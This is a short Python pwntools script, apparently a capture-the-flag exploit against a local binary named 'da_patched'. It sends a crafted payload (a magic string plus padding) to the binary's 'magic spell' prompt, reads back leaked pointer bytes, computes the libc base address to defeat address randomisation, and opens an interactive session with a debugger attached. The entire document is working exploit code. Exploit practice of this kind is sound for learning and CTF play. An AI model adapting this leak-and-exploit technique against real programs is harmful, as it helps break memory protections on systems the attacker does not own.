#!/usr/bin/env python3

from pwn import *

exe = ELF("./da_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch  = 'amd64'
p = process()
gdb.attach(p,gdbscript='''
           brva 0x0000000000001499
           ''')
input()
payload = b'r3dDr4g3nst1str0f1' + b'b'*38
p.sendafter(b"Cast a magic spell to enhance your army's power: ",payload)

p.recvuntil(payload)

leak = u64(p.recv(6).ljust(8,b'\x00'))

libc.address = leak - 0x6eab9

log.info(f"libc base: {hex(libc.address)}")

p.interactive()
